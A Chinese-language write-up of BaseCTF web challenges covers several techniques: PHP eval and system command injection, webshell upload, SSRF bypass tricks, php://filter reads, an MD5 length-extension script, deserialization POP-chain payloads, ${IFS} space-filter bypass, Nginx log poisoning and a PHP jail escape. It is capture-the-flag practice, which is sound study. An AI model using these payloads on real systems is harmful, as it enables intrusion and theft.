

### week1复现

#### A Dark Room

直接f12在源代码中找到答案

![](https://s2.loli.net/2024/11/04/8NQeoMqiVdyhtjF.png)

#### HTTP是什么呀

进入后发现如下内容

![](https://s2.loli.net/2024/11/04/aULcrV8FpOGR51Z.png)

##### 需要注意的参数

1. get传输时，网页会自动进行一次url解码，所以我们需要将%00进行二次url加密，对0加密后变成%30，即输入%%300
2. cookie同样可以传参
   在burp进行相应修改
   ![](https://s2.loli.net/2024/11/04/AjdYPuRBnfO2xDM.png)
   得到这一串字符。
   根据末尾的==猜测可能是base64加密
   使用burp自带的解密工具得到
   ![](https://s2.loli.net/2024/11/04/cbMxElDSZdnOghz.png)  

#### 喵喵喵

进入后发现如下代码
![](https://s2.loli.net/2024/11/04/a5tXgxbijTUnlPF.png)
发现重点函数eval()
测试之后发现没有屏蔽过滤词

```
？DT=system('ls')
```

没有发现相关文件，于是直接查询根目录

```
？DT=system('ls /')
```

![](https://s2.loli.net/2024/11/04/VbFdGR2ZglLOwy1.png)
发现flag文件
选择查看flag

```
？DT=system('ls /flag')
```

得到相关文件
![](https://s2.loli.net/2024/11/04/cfysUoCxbj3PhNY.png)

#### Aura酱的礼物

进入后发现如下代码

![](https://s2.loli.net/2024/11/08/dTLhvHg7EjWcQFO.png)

##### 代码分析

```
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}
```

这里要求读取的文件内容是Aura

通过data://text/plain,xxxx伪协议绕过pen参数的内容匹配

传入data://text/plain;base64,QXVyYQ==
得到提示：
![](https://s2.loli.net/2024/11/17/iUwoPcIxbnFM81h.png)

```
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
} 
```

**ssrf**

参考文章：[https://tttang.com/archive/1648/](https://tttang.com/archive/1648/)

绕过

+ @符，对于一个 url 的访问实际上是以 @符后为准的，比如说[xxxx.com](https://xxxx.com/)@10.10.10.10，则实际上访问的是 10.10.10.10 这个地址。

+ 网址后加 xip.io，其原理是例如 10.10.10.10.xip.io 会被解析成 10.10.10.10。

+ 进制转换，将 ip 转换成八进制、十进制、十六进制这种，同样也可以正常访问，例如将 10.10.10.10 转换为十进制是 168430090，在浏览器访问 http://168430090 就会去访问 10.10.10.10 这个地址。

第二步要以 http://jasmineaura.github.io 开头,因为博客打不开又要再里面写内容,可以使用@ 符号将 url 地址转接到本机上。（这里参考了官方wp）

第三部分使用伪协议读取文件即可（相关内容可在www.blog000.cn中找到）

输入gift=php://filter/read=convert.base64-encode/resource=flag.php
![](https://s2.loli.net/2024/11/17/bNd5M9sVXfyte7x.png)

base64解密即可

#### upload

直接猜测是一句话木马

上传了一个一句话木马之后用蚁剑链接

![](https://s2.loli.net/2024/11/17/OK56Q8tRPfF4aAp.png)

连接成功后在文件中进行翻找，发现flag文件

![](https://s2.loli.net/2024/11/17/gIuBc9vZjLVWe34.png)

### week2复现

#### 一起吃豆豆

打开网页，F12无法使用，所以直接右键查看网页源代码

发现如下

![](https://s2.loli.net/2024/11/08/SyP2JEuT4mcKCpz.png)

分别点击查看

在index.js中发现如下代码

![](https://s2.loli.net/2024/11/08/wjxCZoY8EicGr1A.png)

==号很可疑，于是进行base64解码

![](https://s2.loli.net/2024/11/08/lV3PcgAUpQftBnY.png)

#### 所以你说你懂 MD5?

***由于本题中的相关知识点包含了week1中的知识点（week1用此题中的md5数组绕过即可），week1中的md5碰撞不再阐述***

进入例题，得到相关代码

![](https://s2.loli.net/2024/11/04/4Hn85siMhBcTDau.png)

```
$apple = $_POST['apple'];
$banana = $_POST['banana'];
if (!($apple !== $banana && md5($apple) === md5($banana))) {
    die('加强难度就不会了?');
} 
```

这一部分要求不相等且MD5强相等
所以我们选择数组传输，使得MD5加密值强相等,通过hackerbar输入如下代码

```
apple[]=1 && banana[]=2
```

出现了     难吗？不难的提示
观察第二部分代码

```
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('难吗?不难!'); 
```

这里提示我们会将传入的appple和bananana都会被强制转换成str，然后对其进行若相等md5和数值判断

思路：出现了转换成字符串形式，猜测是使用0e开头字符串默认为0的漏洞，这里上网找到两个md5化之后0e开头的字符串

```
appple=byGcY&bananana=QNKCDZO
```

出现第三个提示

![](https://s2.loli.net/2024/11/04/XWNV36RdmAQED2v.png)

观察第三段代码

```
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('嘻嘻, 不会了? 没看直播回放?');
} 
```

这里将比较类型换成了强比较

那么猜测就是输入两个完全相等的字符串，在网上找到相关字符串

```
ten%0D%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%EF%E4%B5h%A7y%95C%60%8A%E0a%0B%B8%3D%D8%26%F5%A3%13%8F%3F%7D%D4%5Cb%81%25v%98%8CHA%05%0D%ED%C2%8B%E7j%EFou%22%01%10c_%AD%F9%5E%84%A5%C1%95%F9K%3E7%7Bdd%C2dT%98V%B1%F2%DD%B6%2C%F2%7B%E8%19%12%9A%29%9D%5D%13Lm%FEN%85%CE%7E%CD%AF%5B%5B%10eA%E9%B0%C4%AA%94%EA%A2%DE%E9%A0%EBP%98%8A%0A_%1D%13%8E%83%DA%C6%97%21%05%82%E7%EA%03_%27%C4
ten%0D%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%EF%E4%B5h%A7y%95C%60%8A%E0a%0B%B8%3D%D8%26%F5%A3%93%8F%3F%7D%D4%5Cb%81%25v%98%8CHA%05%0D%ED%C2%8B%E7j%EFou%22%01%90c_%AD%F9%5E%84%A5%C1%95%F9K%3E7%FBdd%C2dT%98V%B1%F2%DD%B6%2C%F2%7B%E8%19%12%9A%29%9D%5D%13L%ED%FEN%85%CE%7E%CD%AF%5B%5B%10eA%E9%B0%C4%AA%94%EA%A2%DE%E9%A0%EBP%98%0A%0A_%1D%13%8E%83%DA%C6%97%21%05%82%E7j%03_%27%C4
```

出现提示：

![](https://s2.loli.net/2024/11/17/t7ivkuGcYRlmAhE.png)

进入到第四步。参考文献([BaseCTF之web（week2）_basectf第二周 所以你说你懂md5?-CSDN博客](https://blog.csdn.net/qq_74350234/article/details/141757892?ops_request_misc=%7B%22request%5Fid%22%3A%22C27CC3F1-B5A6-4922-8413-717AA35708CA%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=C27CC3F1-B5A6-4922-8413-717AA35708CA&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-141757892-null-null.142^v100^pc_search_result_base4&utm_term=所以你说你懂 md5&spm=1018.2226.3001.4187))
脚本源码

```python
from struct import pack, unpack
from math import floor, sin
 
 
"""
MD5 Extension Attack
====================
@refs
https://github.com/shellfeel/hash-ext-attack
"""
 
 
class MD5:
 
    def __init__(self):
        self.A, self.B, self.C, self.D = \
            (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476)  # initial values
        self.r: list[int] = \
            [7, 12, 17, 22] * 4 + [5,  9, 14, 20] * 4 + \
            [4, 11, 16, 23] * 4 + [6, 10, 15, 21] * 4  # shift values
        self.k: list[int] = \
            [floor(abs(sin(i + 1)) * pow(2, 32))
             for i in range(64)]  # constants
 
    def _lrot(self, x: int, n: int) -> int:
        # left rotate
        return (x << n) | (x >> 32 - n)
 
    def update(self, chunk: bytes) -> None:
        # update the hash for a chunk of data (64 bytes)
        w = list(unpack('<'+'I'*16, chunk))
        a, b, c, d = self.A, self.B, self.C, self.D
 
        for i in range(64):
            if i < 16:
                f = (b & c) | ((~b) & d)
                flag = i
            elif i < 32:
                f = (b & d) | (c & (~d))
                flag = (5 * i + 1) % 16
            elif i < 48:
                f = (b ^ c ^ d)
                flag = (3 * i + 5) % 16
            else:
                f = c ^ (b | (~d))
                flag = (7 * i) % 16
 
            tmp = b + \
                self._lrot((a + f + self.k[i] + w[flag])
                           & 0xffffffff, self.r[i])
            a, b, c, d = d, tmp & 0xffffffff, b, c
 
        self.A = (self.A + a) & 0xffffffff
        self.B = (self.B + b) & 0xffffffff
        self.C = (self.C + c) & 0xffffffff
        self.D = (self.D + d) & 0xffffffff
 
    def extend(self, msg: bytes) -> None:
        # extend the hash with a new message (padded)
        assert len(msg) % 64 == 0
        for i in range(0, len(msg), 64):
            self.update(msg[i:i + 64])
 
    def padding(self, msg: bytes) -> bytes:
        # pad the message
        length = pack('<Q', len(msg) * 8)
 
        msg += b'\x80'
        msg += b'\x00' * ((56 - len(msg)) % 64)
        msg += length
 
        return msg
 
    def digest(self) -> bytes:
        # return the hash
        return pack('<IIII', self.A, self.B, self.C, self.D)
 
 
def verify_md5(test_string: bytes) -> None:
    # (DEBUG function) verify the MD5 implementation
    from hashlib import md5 as md5_hashlib
 
    def md5_manual(msg: bytes) -> bytes:
        md5 = MD5()
        md5.extend(md5.padding(msg))
        return md5.digest()
 
    manual_result = md5_manual(test_string).hex()
    hashlib_result = md5_hashlib(test_string).hexdigest()
 
    assert manual_result == hashlib_result, "Test failed!"
 
 
def attack(message_len: int, known_hash: str,
           append_str: bytes) -> tuple:
    # MD5 extension attack
    md5 = MD5()
 
    previous_text = md5.padding(b"*" * message_len)
    current_text = previous_text + append_str
 
    md5.A, md5.B, md5.C, md5.D = unpack("<IIII", bytes.fromhex(known_hash))
    md5.extend(md5.padding(current_text)[len(previous_text):])
 
    return current_text[message_len:], md5.digest().hex()
 
 
if __name__ == '__main__':
 
    message_len = int(input("[>] Input known text length: "))
    known_hash = input("[>] Input known hash: ").strip()
    append_text = input("[>] Input append text: ").strip().encode()
 
    print("[*] Attacking...")
 
    extend_str, final_hash = attack(message_len, known_hash, append_text)
 
    from urllib.parse import quote
    from base64 import b64encode
 
    print("[+] Extend text:", extend_str)
    print("[+] Extend text (URL encoded):", quote(extend_str))
    print("[+] Extend text (Base64):", b64encode(extend_str).decode())
    print("[+] Final hash:", final_hash)
```

按照如下进行编写
![](https://s2.loli.net/2024/11/17/Ex6IqnfMo2R3DHj.png![](https://s2.loli.net/2024/11/17/FvKIm1OecPDVERC.png)

将url粘贴到name，将hash粘贴到md5即可

![](https://s2.loli.net/2024/11/17/fwsntA8qua6HS9N.png)



#### 你听不见我的声音

打开网址，发现如下内容：

![](https://s2.loli.net/2024/11/17/FjBGrkQADuToK2q.png)

通过shell_exec函数可知，这是一个无回显shell，可通过将flag文件读取后直接写入txt文件中

写入后直接访问1.txt得到flag

##### PHP执行系统命令的4个方法 :

system 函数：system 函数执行系统命令，并将输出直接打印到标准输出。它的返回值是命令的最后一行输出或者返回状态码（命令成功执行返回0）。



shell_exec 函数：shell_exec 函数执行系统命令，但它将命令的输出作为字符串返回，而不是打印到标准输出。如果命令没有输出，则返回空字符串。



exec 函数：exec 函数执行系统命令，并将输出存储到一个数组中，每一行命令输出作为数组的一个元素。它的返回值是命令的最后一行输出或者返回状态码。



passthru 函数：passthru 函数执行系统命令，并直接将命令的输出发送到标准输出。它不会返回任何输出结果，而是直接将输出显示在屏幕上。

当命令执行方式为exce或者shell_exce之类的无回显函数时，我们有以下两种解决方案

###### 用nc进行shell反弹

###### 写入文件后进行访问

在进行了正常操作完成flag查询之后发现没有回显

那么我们除了nc的shell回显之外，还能采取文件读取的方法

例如

正常输入  ?cmd= tac /f*

发现是用shell_exce()函数进行的命令执行,无回显显示

那么我们用>符号将flag写入1.txt（随便写一个文件名也行）

?cmd=tac /f* > 1.txt

访问 1.txt即可

#### ez_ser

发现代码，有题目可知，这是一道简单的序列化和反序列化题目

构造pop链：

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){ //调用字符串
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;  // 2 __get——>pwn
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;   //3 __tostring-->re
        }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk=gods;    //dusk=gods
    public $over;
    public function __get($name) {     //找不可访问的对象 
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();    // 1 Misc 
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");      //0 目的地
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
$ser = $_GET['ser'];   //触发get
unserialize($ser);
```

##### 构造pop链：

web中的__wakeup()->re中的chu0->pwn中的over-> Misc 中的 getflag()

于是加上以下代码并将定义duck的代码中duck的值直接修改为gods（省去后续修改步骤）

```php
$w = new web;
$r = new re;
$p = new pwn;
$m = new Misc;
$p->over = $m;
$r->chu0 = $p;
$p->over = $m;
echo serilize($w)
```

输出结果为

O:3:"web":2:{s:2:"kw";O:2:"re":1:{s:4:"chu0";O:3:"pwn":2:{s:4:"dusk";N;s:4:"over";O:4:"Misc":2:{s:7:"nothing";N;s:4:"flag";N;}}}s:2:"dt";N;}

得到flag

####  RCEisamazingwithspace

```php
 <?php
highlight_file(__FILE__);
$cmd = $_POST['cmd'];
// check if space is present in the command
// use of preg_match to check if space is present in the command
if (preg_match('/\s/', $cmd)) {
    echo 'Space not allowed in command';
    exit;
}

// execute the command
system($cmd); 
```

发现屏蔽了空格符号

'\s'表示可以匹配任意一个空白字符，就比如说：换页符、换行符、回车和制表符等。

这里尝试了各种绕过，发现只有${IFS}可以

输入获得flag

![](https://s2.loli.net/2024/11/16/1JORp6hqAge72ir.png)

#### 数学大师

发现需要我们不断在3s内答出加减乘除，这里使用ai辅助写出了一个脚本

```php
import requests
import re
import time

# 设置会话对象
session = requests.Session()

# 目标网址
url = 'http://gz.imxbt.cn:20472/'


def get_question(html):
    # 使用正则表达式从HTML中提取数学问题
    match = re.search(r'Tell me in \d+ second (\d+)([+\-*/÷×])(\d+)', html)
    if match:
        num1 = int(match.group(1))
        num2 = int(match.group(3))
        operator = match.group(2)
        return num1, num2, operator
    return None, None, None


def solve_question(num1, num2, operator):
    # 根据操作符计算结果
    if operator == '+':
        return num1 + num2
    elif operator == '-':
        return num1 - num2
    elif operator == '*' or operator == '×':
        return num1 * num2
    elif operator == '/' or operator == '÷':
        return num1 // num2  # 整数除法
    return None


def main():
    for i in range(50):  # 循环50次，解决50个问题
        start_time = time.time()

        if i == 0:
            # 第一次获取页面内容
            response = session.get(url)
            question_html = response.text
            print(f"获取页面内容成功，第 {i + 1} 题: {question_html}")
        else:
            # 从上次发送答案后的响应中提取新的问题
            question_html = response.text
            print(f"获取页面内容成功，第 {i + 1} 题: {question_html}")

        # 获取并解析数学问题
        num1, num2, operator = get_question(question_html)
        if num1 is None or num2 is None or operator is None:
            print('无法获取数学问题')
            print(f"问题解析失败，当前HTML内容: {question_html}")
            break

        print(f"解析到的问题: {num1} {operator} {num2}")

        # 计算答案
        answer = solve_question(num1, num2, operator)
        if answer is None:
            print('无法计算答案')
            break

        print(f"计算的答案: {answer}")

        # 发送答案
        data = {'answer': answer}
        response = session.post(url, data=data)
        print(f"发送答案成功，服务器响应: {response.text}")

        end_time = time.time()
        elapsed_time = end_time - start_time
        if elapsed_time < 3:  # 如果处理时间小于3秒，则等待剩余的时间
            time.sleep(3 - elapsed_time)


if __name__ == '__main__':
    main()
```

这是答题结果
![](https://s2.loli.net/2024/11/17/lXeSxiCkhRH4FE6.png)

#### Realy ez PoP



```php
<?php
error_reporting(0);
 
class Sink
{
    private $cmd = 'echo 123;';
    public function __construct()
    {
        $this->cmd = "system('ls /');";
    }
    public function __toString()
    {
        eval ($this->cmd);
    }
}
 
class Shark
{
    private $word = 'Hello, World!';
    public function __construct()
    {
        $this->word = new Sink();
    }
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}
 
class Sea
{
    public $animal;
    public function __construct()
    {
        $this->animal = new Shark();
    }
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}
 
class Nature
{
    public $sea;
    public function __construct()
    {
        $this->sea = new Sea();
    }
    public function __destruct()
    {
        echo $this->sea->see;
    }
}
$ser = new Nature();
echo urlencode(serialize($ser));
```

获得如下代码

nature=O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D%7D%7D%7D

![](https://s2.loli.net/2024/11/17/Ba9KOikJPYof7sb.png)

之后将文件中的ls /更改为cat /flag输出反序列化之后即可获得flag

![](https://s2.loli.net/2024/11/17/JrNLZXDC6RTK74m.png)

![](https://s2.loli.net/2024/11/17/Ba9KOikJPYof7sb.png)
### Week3

#### 玩原神玩的

```
 <?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("错了！就你还想玩原神？❌❌❌");
}

function ys_open($tip) {
  if ($tip != "我要玩原神") {
    die("我不管，我要玩原神！😭😭😭");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("可恶的QQ人！😡😡😡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("某站崩了？肯定是某忽悠干的！😡😡😡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  
  echo json_encode($flag);
} 错了！就你还想玩原神？❌❌❌

```

第一步要求我们输入一个长度和$array相同的数组，这里一点点试探，试出长度为45

```
len[]=0&len[]=1&len[]=2&len[]=3&len[]=4&len[]=5&len[]=6&len[]=7&len[]=8&len[]=9&len[]=10&len[]=11&len[]=12&len[]=13&len[]=14&len[]=15&len[]=16&len[]=17&len[]=18&len[]=19&len[]=20&len[]=21&len[]=22&len[]=23&len[]=24&len[]=25&len[]=26&len[]=27&len[]=28&len[]=29&len[]=30&len[]=31&len[]=32&len[]=33&len[]=34&len[]=35&len[]=36&len[]=37&len[]=38&len[]=39&len[]=40&len[]=41&len[]=42&len[]=43&len[]=44
```

之后传入?tip=我要玩原神完成第二步

传入m[]=0&m[]=1完成第三步
第四步需要我们将m[0]和m[1]的值分别修改为100%和love100%.md5($a)

其中md5($a)加密值为30BD7CE7DE206924302499F197C7A966

%用url加密得到

```
%25len[]=0&len[]=1&len[]=2&len[]=3&len[]=4&len[]=5&len[]=6&len[]=7&len[]=8&len[]=9&len[]=10&len[]=11&len[]=12&len[]=13&len[]=14&len[]=15&len[]=16&len[]=17&len[]=18&len[]=19&len[]=20&len[]=21&len[]=22&len[]=23&len[]=24&len[]=25&len[]=26&len[]=27&len[]=28&len[]=29&len[]=30&len[]=31&len[]=32&len[]=33&len[]=34&len[]=35&len[]=36&len[]=37&len[]=38&len[]=39&len[]=40&len[]=41&len[]=42&len[]=43&len[]=44&m[]=100%25&m[]=love100%2530bd7ce7de206924302499f197c7a966

```

贴一下上传内容,得到

```
["3295c76acbf4caaed33c36b1b5fc2cb1","26657d5ff9020d2abefe558796b99584","73278a4a86960eeb576a8fd4c9ec6997","ec8956637a99787bd197eacd77acce5e","e2c420d928d4bf8ce0ff2ec19b371514","43ec517d68b6edd3015b3edc9a11367b","ea5d2f1c4608232e07d3aa3d998e5135","c8ffe9a587b126f152ed3d89a146b445","03afdbd66e7929b125f8597834fa83a4","66f041e16a60928b05a7e228a89c3799","44f683a84163b3523afe57c2e008bc8c","03afdbd66e7929b125f8597834fa83a4","44f683a84163b3523afe57c2e008bc8c","9a1158154dfa42caddbd0694a4e9bdc8","c9e1074f5b3f9fc8ea15d152add07294","5f93f983524def3dca464469d2cf9f3e","7f39f8317fbdb1988ef4c628eba02591","d645920e395fedad7bbbed0eca3fe2e0","07e1cd7dca89a1678042477183b7ac3f","6364d3f0f495b6ab9dcf8d3b5c6e0b01","6364d3f0f495b6ab9dcf8d3b5c6e0b01","9f61408e3afb633e50cdf1b20de6f466","e369853df766fa44e1ed0ff613f563bd","c45147dee729311ef5b5c3003946c48f","d9d4f495e875a2e075a1a4a6e1b9770f","da4fb5c6e93e74d3df8527599fa62642","b53b3a3d6ab90ce0268229151c9bde11","e369853df766fa44e1ed0ff613f563bd","a1d0c6e83f027327d8461063f4ac58a6","a5bfc9e07964f8dddeb95fc584cd965d","d67d8ab4f4c10bf22aa353e27879133c","c0c7c76d30bd3dcaefc96f40275bdc0a","b6d767d2f8ed5d21a44b0e5886680cb9","14bfa6bb14875e45bba028a21ed38046","4e732ced3463d06de0ca9a15b6153677","1f0e3dad99908345f7439f8ffabdffc4","33e75ff09dd601bbe69f351039152189","e2c420d928d4bf8ce0ff2ec19b371514","70efdf2ec9b086079795c442636b55fb","1f0e3dad99908345f7439f8ffabdffc4","c16a5320fa475530d9583c34fd356ef5","32bb90e8976aab5298d5da10fe66f21d","6ea9ab1baa0efb9e19094440c317e21b","6f4922f45568161a8cdf4ad2299f6d23","43ec517d68b6edd3015b3edc9a11367b"]
```

```php
include 'flag.php';
  $flag[] = array();  //将flag中的元素放进一个数组中存储
  for ($ii = 0;$ii < sizeof($array);$ii++) {  //遍历每一个元素 
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii); //获取flag的元素的编码并与编号进行异或运算
  }
  
  echo json_encode($flag);    //使用 json_encode 函数将 $flag 数组转换为 JSON 格式
} 
```

本来是使用py脚本，但是好像是py脚本和php的加密方式不一样，所以试了试

```
<?php

$md5 = [
    "3295c76acbf4caaed33c36b1b5fc2cb1", "26657d5ff9020d2abefe558796b99584",
    "73278a4a86960eeb576a8fd4c9ec6997", "ec8956637a99787bd197eacd77acce5e",
    "e2c420d928d4bf8ce0ff2ec19b371514", "43ec517d68b6edd3015b3edc9a11367b",
    "ea5d2f1c4608232e07d3aa3d998e5135", "c8ffe9a587b126f152ed3d89a146b445",
    "f457c545a9ded88f18ecee47145a72c0", "03afdbd66e7929b125f8597834fa83a4",
    "093f65e080a295f8076b1c5722a46aa2", "03afdbd66e7929b125f8597834fa83a4",
    "698d51a19d8a121ce581499d7b701668", "d82c8d1619ad8176d665453cfb2e55f0",
    "b53b3a3d6ab90ce0268229151c9bde11", "9f61408e3afb633e50cdf1b20de6f466",
    "7f39f8317fbdb1988ef4c628eba02591", "07e1cd7dca89a1678042477183b7ac3f",
    "a1d0c6e83f027327d8461063f4ac58a6", "7f6ffaa6bb0b408017b62254211691b5",
    "d67d8ab4f4c10bf22aa353e27879133c", "9f61408e3afb633e50cdf1b20de6f466",
    "e369853df766fa44e1ed0ff613f563bd", "5fd0b37cd7dbbb00f97ba6ce92bf5add",
    "67c6a1e7ce56d3d6fa748ab6d9af3fd7", "3416a75f4cea9109507cacd8e2f2aefc",
    "b53b3a3d6ab90ce0268229151c9bde11", "1c383cd30b7c298ab50293adfecb7b18",
    "3416a75f4cea9109507cacd8e2f2aefc", "da4fb5c6e93e74d3df8527599fa62642",
    "c8ffe9a587b126f152ed3d89a146b445", "c0c7c76d30bd3dcaefc96f40275bdc0a",
    "735b90b4568125ed6c3f678819b6e058", "14bfa6bb14875e45bba028a21ed38046",
    "fc490ca45c00b1249bbe3554a4fdf6fb", "37693cfc748049e45d87b8c7d8b9aacd",
    "37693cfc748049e45d87b8c7d8b9aacd", "98f13708210194c475687be6106a3b84",
    "3c59dc048e8850243be8079a5c74d079", "fc490ca45c00b1249bbe3554a4fdf6fb",
    "33e75ff09dd601bbe69f351039152189", "4e732ced3463d06de0ca9a15b6153677",
    "33e75ff09dd601bbe69f351039152189", "c16a5320fa475530d9583c34fd356ef5",
    "43ec517d68b6edd3015b3edc9a11367b"
];

// 用于存储还原出的字符
$flag = '';

for ($i = 0; $i < count($md5); $i++) {
    for ($j = 0; $j < 256; $j++) {
        // 计算异或操作后的值
        $xor_result = $j ^ $i;
        // 计算MD5值
        $calculated_md5 = md5($xor_result);
        // 如果计算出的MD5值与给定的MD5值匹配，则找到了正确的字符
        if ($calculated_md5 === $md5[$i]) {
            $flag .= chr($j);
            break;
        }
    }
}

echo "Flag: " . $flag . "\n";

?>

```

运行后得到结果

Flag: BaseCTF{9614c897-f8c3-4e70-85eb-cdc4313f4364}

#### 滤个不停

##### Nginx日志注入

参考文献([【CTF】Nginx日志注入_ctf nginx-CSDN博客](https://blog.csdn.net/star3119391396/article/details/142412092?ops_request_misc=&request_id=&biz_id=102&utm_term=CTFnginx&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-142412092.142^v100^pc_search_result_base4&spm=1018.2226.3001.4187))

日志包含漏洞的成因还是服务器没有进行严格的过滤 ，导致用户可以进行任意文件读取，但是前提是服务器需要开启了记录日志的功能才可以利用这个漏洞。

```
对于Apache，日志存放路径：/var/log/apache/access.log

对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log
```

```
/etc/nginx/nginx.conf：该文件是Nginx的配置的文件，该文件保存着能够影响服务器运行的配置信息。有时会泄露敏感信息。该文件支持php解析。
/var/log/nginx/access.log：该文件是Nginx的访问日志文件，Nginx会把每个用户访问信息记录到指定的日志文件里。该文件支持php解析。
```

一般结合一句话木马使用

写入一句话木马之后，使用蚁剑尝试连接

连接url即为日志的地址：?url=/var/log/nginx/access.log

##### 题目分析



```
 <?php
highlight_file(__FILE__);
error_reporting(0);

$incompetent = $_POST['incompetent'];
$Datch = $_POST['Datch'];

if ($incompetent !== 'HelloWorld') {
    die('写出程序员的第一行问候吧！');
}

//这是个什么东东？？？
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
$is_valid = true;

foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
}

if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('此路不通换条路试试?');
        }
    }


    include($Datch);
} else {
    die('文件名不合规 请重试');
}
?>
文件名不合规 请重试
```

注意到Datch会直接进行include函数执行，发现漏洞，需要我们执行

第一步基础不多讲

第二部要绕过对于Datch的检测

查询后发现strpos()函数可以用数组进行绕过，即用Datch[]=即可

第三步大量的伪协议都ban了，上网进行搜索，发现是Nginx日志注入

从burp看见server

```
Server: nginx/1.18.0
```

拥有nginx关键词

输入/var/log/nginx/access.log尝试注入，burp显示能够进行

![](https://s2.loli.net/2024/11/17/IU5Ypt2QOL1ZvBf.png)

左侧出现了相关日志

发现是User-Agent中的内容，因此我们在其中插入一句话木马，直接执行即可获得flag

![](https://s2.loli.net/2024/11/17/ncl3v7MhTP4gj8O.png)

#### ez_php_jail

##### 前置知识点

```
当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这

个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。
所以正确形式应该是?Jail[by.Happy=
```

```
highlight_file配合glob, glob 通常用于匹配符合特定规则的文件路径名, glob("/f*") 会搜索文件系统中所有以 /f 开头的文件或目录。然后，通过 [0] 索引选择第一个匹配的结果
```

```php
<?php
// 显示当前文件的源代码
highlight_file(__FILE__);

// 关闭错误报告，防止输出错误信息
error_reporting(0);

// 包含一个名为 hint.html 的文件
include("hint.html");

// 获取GET请求中的'Jail_by.Happy'参数
$Jail = $_GET['Jail_by.Happy'];

// 检查'Jail_by.Happy'参数是否存在
if ($Jail == null) {
    // 如果不存在，终止脚本并输出提示信息
    die("Do You Like My Jail?");
}

// 定义一个函数，用于检查输入是否包含某些特定字符或关键字
function Like_Jail($var) {
    // 使用正则表达式检查输入是否包含特定字符或关键字
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        // 如果包含，返回false
        return false;
    }
    // 如果不包含，返回true
    return true;
}

// 调用Like_Jail函数检查$Jail参数
if (Like_Jail($Jail)) {
    // 如果检查通过，使用eval执行$Jail中的代码
    eval($Jail);
    // 输出提示信息
    echo "Yes! you escaped from the jail! LOL!";
} else {
    // 如果检查未通过，输出提示信息
    echo "You will Jail in your life!";
}

// 输出换行符
echo "\n";

// 在HTML解析后再输出PHP源代码
highlight_file(__FILE__);

?>
```

首先查看，需要我们传参，根据前面的知识，实际上应该为?Jail[by.Happy=

之后使用highlight_file和glob函数来联合查询

```
highlight_file配合glob, glob 通常用于匹配符合特定规则的文件路径名, glob("/f*") 会搜索文件系统中所有以 /f 开头的文件或目录。然后，通过 [0] 索引选择第一个匹配的结果
```

```Plain
?Jail[by.Happy=highlight_file(glob("/f*")[0]);
```

（这里应该主要考察的还是一种新的文件检索方法吧）

![](https://s2.loli.net/2024/11/17/YGIhizspKe42cTA.png)

#### 复读机

首先通过粗表大致试出屏蔽词

发现屏蔽了

```
+ - * / . {{ }} __ : " \ 和class等关键词

关键词通过cl''ass绕过

